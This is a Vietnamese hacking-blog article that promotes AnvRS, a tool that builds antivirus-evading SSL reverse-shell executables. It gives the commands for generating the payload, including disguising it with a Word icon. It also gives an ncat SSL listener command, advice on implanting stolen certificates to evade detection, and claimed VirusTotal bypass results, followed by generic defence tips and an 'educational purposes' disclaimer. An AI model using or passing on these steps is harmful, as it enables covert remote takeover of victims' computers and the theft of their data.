# AnvRS – Công cụ Reverse Shell Bypass Antivirus

**Tác giả:** Hevin  
**Danh mục:** Basic Hacking  
**Nguồn:** [AnonyViet](https://anonyviet.com/anvrs-cong-cu-reverse-shell-bypass-antivirus/)

---

**⚠️ LƯU Ý QUAN TRỌNG:** Công cụ này chỉ dành cho mục đích giáo dục, nghiên cứu và học tập. Vui lòng không sử dụng vào mục đích xấu. AnonyViet sẽ không chịu toàn bộ trách nhiệm về các hành vi bất hợp pháp!

## Giới thiệu

Trong thời đại Internet, việc bảo mật thông tin và hệ thống trước những mối nguy hiểm trở nên cần thiết hơn bao giờ hết. Cùng với sự ra đời của những công cụ bảo mật và diệt virus, các hacker cũng không ngừng tìm cách để lách qua rào cản bảo mật và tấn công các hệ thống mục tiêu.

Một trong những kỹ thuật phổ biến trong việc xâm nhập hệ thống mạng mà các hacker sử dụng để tiếp cận và kiểm soát các hệ thống từ xa là "Reverse Shell". Đây là một khái niệm đã trở nên không còn xa lạ với cộng đồng an ninh mạng.

Trong bài viết này, chúng ta sẽ tìm hiểu về AnvRS - một công cụ Reverse Shell được phát triển bởi AnonyViet với khả năng bypass các phần mềm chống virus thông qua việc sử dụng kết nối SSL.

## Reverse Shell và SSL là gì?

### Reverse Shell
- Là một kỹ thuật phổ biến đối với việc xâm nhập hệ thống mạng
- Máy tính bị xâm nhập sẽ tạo ra một kết nối với máy tính mục tiêu của kẻ tấn công
- Cho phép kẻ tấn công tiến hành các hoạt động xâm nhập từ xa:
  - Cài đặt mã độc
  - Đánh cắp dữ liệu
  - Sửa đổi cấu hình hệ thống
- Kỹ thuật này chủ yếu được sử dụng nhằm khai thác độ tin cậy của hệ thống mạng

### SSL (Secure Sockets Layer)
- Là giao thức bảo mật được thiết kế nhằm mã hóa dữ liệu truyền giữa máy tính người dùng và máy chủ
- Ngăn người thứ ba nào lấy được dữ liệu
- SSL tạo ra một kênh bảo mật giữa hai bên nhằm bảo vệ sự riêng tư và toàn vẹn của dữ liệu

### Kết hợp Reverse Shell và SSL
Khi phối hợp giữa Reverse Shell và SSL trong một cuộc tấn công:
- Cho phép hacker tạo ra một kết nối từ xa với máy tính mục tiêu qua một kênh bảo mật bằng SSL
- Làm cho việc phát hiện và ngăn chặn các biện pháp kiểm soát an ninh trở nên khó hơn
- Dữ liệu được lưu trữ và gửi qua mạng một cách an toàn
- Hacker sẽ thực hiện các cuộc tấn công reverse shell khó bị phát hiện hơn

## Cách cài đặt và sử dụng công cụ AnvRS

### Yêu cầu hệ thống
Trước khi sử dụng công cụ AnvRS, bạn cần:
- Python 3.10 trở lên
- Microsoft Visual C++ Build Tools
- Ncat
- PyInstaller phiên bản mới nhất (hiện tại là 5.13.1)

### Cài đặt PyInstaller
1. **Gỡ cài đặt phiên bản cũ (nếu có):**
   ```bash
   python -m pip uninstall pyinstaller
   ```

2. **Tải PyInstaller mới nhất từ GitHub**

3. **Giải nén và cài đặt:**
   ```bash
   cd bootloader
   python ./waf all
   ```

4. **Cài đặt với quyền Admin:**
   ```bash
   python -m pip install .
   ```

### Sử dụng AnvRS

1. **Tạo file AnvRS.py** với mã nguồn từ AnonyViet

2. **Tạo payload cơ bản:**
   ```bash
   python AnvRS.py -i <YourIpAddress> -p <YourPort> -o <YourName>.exe
   ```
   
   **Ví dụ:**
   ```bash
   python AnvRS.py -i 127.0.0.1 -p 6789 -o ReverseShell.exe
   ```

3. **Tạo payload với icon:**
   ```bash
   python AnvRS.py -i 127.0.0.1 -p 6789 --icon <PathToIconFile>.ico -o ReverseShell.exe
   ```
   
   **Ví dụ:**
   ```bash
   python AnvRS.py -i 127.0.0.1 -p 6789 --icon C:\Users\test\Downloads\word.ico -o ReverseShell.exe
   ```

### Chuẩn bị cuộc tấn công
Sử dụng ncat để lắng nghe kết nối:
```bash
ncat --ssl -lnvp <YourPort> -4 <YourIpAddress>
```

**Ví dụ:**
```bash
ncat --ssl -lnvp 6789 -4 127.0.0.1
```

### Tăng khả năng Bypass
Sau khi tạo payload, bạn có thể:
- Cấy thêm chứng chỉ để tăng khả năng Bypass Antivirus
- Sử dụng kỹ thuật "Cấy Certificate từ App khác vào Virus để Bypass AV"

## Kết quả kiểm tra Antivirus

Công cụ AnvRS đã được kiểm tra trên các trang web quét virus online:

### VirusTotal
- Kết quả cho thấy khả năng bypass tốt
- Link kiểm tra: [VirusTotal Results]

### MetaDefender
- Kết quả tương tự với khả năng bypass cao
- Link kiểm tra: [MetaDefender Results]

### Jotti Virus Scanner
- Xác nhận khả năng bypass antivirus
- Link kiểm tra: [Jotti Results]

## Cách phòng chống cuộc tấn công Reverse Shell kết hợp SSL

### 1. Firewall và ACLs
- Thiết lập tường lửa (firewall) và danh sách kiểm soát truy cập (Access Control Lists – ACLs)
- Kiểm soát và giới hạn quyền truy cập vào hệ thống từ bên ngoài
- Chặn các kết nối không cần thiết
- Chỉ cho phép các kết nối đến từ các nguồn đáng tin cậy

### 2. Kiểm tra và theo dõi lưu lượng mạng
- Theo dõi lưu lượng mạng và kiểm tra các kết nối đang diễn ra
- Phát hiện sự xuất hiện của các kết nối lạ và không mong muốn
- Sử dụng các công cụ phân tích lưu lượng mạng

### 3. Cập nhật hệ thống và ứng dụng
- Đảm bảo hệ thống và các ứng dụng luôn được cập nhật lên phiên bản mới nhất
- Bao gồm cả các bản vá bảo mật
- Giúp giảm thiểu các lỗ hổng bảo mật

### 4. Phần mềm chống virus và phát hiện xâm nhập
- Sử dụng phần mềm chống virus và phần mềm phát hiện xâm nhập
- Kiểm tra và ngăn chặn các hoạt động độc hại
- Cập nhật và cấu hình thường xuyên

### 5. Giám sát hoạt động bất thường
- Theo dõi hoạt động của hệ thống
- Phát hiện các biểu hiện của cuộc tấn công hoặc hoạt động bất thường
- Thiết lập cảnh báo tự động

### 6. Phân tích lưu lượng mạng
- Sử dụng các công cụ phân tích lưu lượng mạng chuyên dụng
- Xác định các mẫu không bình thường và hoạt động xâm nhập
- Phân tích deep packet inspection

### 7. Quản lý quyền truy cập
- Hạn chế quyền truy cập của người dùng và ứng dụng
- Chỉ cấp quyền truy cập vào những gì cần thiết
- Áp dụng nguyên tắc "least privilege"

### 8. Xác thực và ủy quyền
- Áp dụng các biện pháp xác thực mạnh mẽ
- Quản lý ủy quyền cẩn thận
- Đảm bảo chỉ các người dùng có quyền truy cập thực sự có thể tham gia vào hệ thống
- Sử dụng xác thực đa yếu tố (MFA)

## Kết luận

AnvRS là một công cụ mạnh mẽ dành cho việc tạo ra các reverse shell có khả năng bypass antivirus. Đây là một công cụ đáng để nghiên cứu và học tập cho:
- Chuyên gia bảo mật
- Penetration Tester
- Nhà nghiên cứu an ninh mạng

**Lưu ý:** Luôn duy trì tinh thần học hỏi và cùng nhau xây dựng một cộng đồng an toàn và bảo mật trên không gian số. Sử dụng công cụ này một cách có trách nhiệm và chỉ trong môi trường kiểm thử được phép.

---

**Tags:** Reverse Shell, SSL, Bypass Antivirus, Penetration Testing, Cybersecurity

**Tác giả:** Hevin - AnonyViet Team